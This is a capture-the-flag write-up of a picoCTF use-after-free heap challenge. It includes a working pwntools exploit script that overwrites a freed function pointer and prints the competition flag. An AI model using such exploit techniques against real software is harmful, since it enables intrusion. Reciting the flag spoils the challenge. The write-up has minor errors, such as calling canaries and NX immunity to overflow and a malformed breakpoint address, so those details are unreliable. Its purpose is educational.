From the challenge name, we infer that this challenge is based on UAF, i.e, user after free

Use-After-Free (UAF) is a vulnerability related to incorrect use of dynamic memory during program operation. If after freeing a memory location, a program does not clear the pointer to that memory, an attacker can use the error to hack the program.

First step is to do file and check the file type

```bash
$ file vuln    
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=89699d062dc4f47448ba7c5c03105267c060ce30, not stripped
```

The “not stripped” at the end indicates that that the debugging symbols and other debugging-related information have not been removed or stripped from the binary file.

So we can check the debugging related info by using checksec

```bash
$ checksec --file=vuln 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   103 Symbols	  No	0		4		vuln
```

Stack canary is found and NX is enabled, this indicates that the executable is immune to buffer overflow, i,e, shell code can’t be injected.

```python
void s(){
	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
	puts("Thanks for subscribing! I really recommend becoming a premium member!");
}
```

- %p prints out the address of the function hahaexploitgobrrr

- User is a struct object, memory is allocated for the object using malloc.

- As a result, whatToDo pointer and username pointer are created and stored.

- Then,when this memory is freed, the same memory is allocated to malloc.

- Once we receive the address of hahaexploitgobrr, we have to pass it as message. Since, the same pointer is pointing to all functions, once we make a twitter account the whatToDo pointer is created and space is allocated for the function in user, now once this user is deleted when we do I, that space is freed, and the same pointer points for a different function but to the same area. Since, after we pass in our message, i.e, the function 

- The pointer created by obj user, whatToDO basically points to a memory location in and the message is written in the same memory location as the function pointer in the object, i.e, the message is written instead of the function pointer once the message is entered, because it’s a free chunk, once the memory is called, the doProcess dereferences whatever is there at whatToDo pointer which thus calls the hahaexploitgobrrr function

  - Here is demonstration of heap being allocated deallocated and reallocated
  - So open the exe file in ghidra to get the breakpoints

- break point 1 in main(), where we allocate storage to user `b*0x08048d6f`
- break point 2 in i(), when we free the storage `b *0x08048afff`
- breakpoint 3 where it is reallocated for message `b*0x08048a61`

- Now running it with the breakpoints in gef
- We can see that address is saved in eax at 0x0804c1a0
- We can also see that all the tcache bins are empty by doing heap bin
- We now create account and see that myname is stored at so and so position. Now, we free the memory, click c to continue and enter I. We can see that the user buffer is freed and is in the tcache bin. Once we select message, we see that the bins are empty, this means that memory is allocated to message now
- now, pressing c and continuing. It says segmentation fault, this is because it tries to dereference whatever we enter. So we pass address of hahaexploitgobrrr as message. To collect the read value we need a pwnscript as this cant be done on terminal
- here is a simple pwnscript
```python
from pwn import *
p = remote("mercury.picoctf.net",4504)
context.log_level='debug'
p.sendlineafter(b'(e)xit',b'M')
p.sendlineafter(b':',b'myname')
p.sendlineafter(b'(e)xit',b'S')
p.recvuntil(b'OOP! Memory leak...', drop=True)

leak = int(p.recvlineS(),16)

info("leaked hahaexploitgobrrr() add: %#x",leak)

p.sendlineafter(b'(e)xit',b'I')
p.sendlineafter(b'?',b'Y')
p.sendlineafter(b'(e)xit',b'L')
p.sendlineafter(b':',flat(leak))
p.interactive()
```

So now, on running this,
We see the flag
```bash
[*] Switching to interactive mode

[DEBUG] Received 0x22 bytes:
    b'picoCTF{d0ubl3_j30p4rdy_4245f637}\n'
picoCTF{d0ubl3_j30p4rdy_4245f637}
```

**FLAG - `picoCTF{d0ubl3_j30p4rdy_4245f637}`**

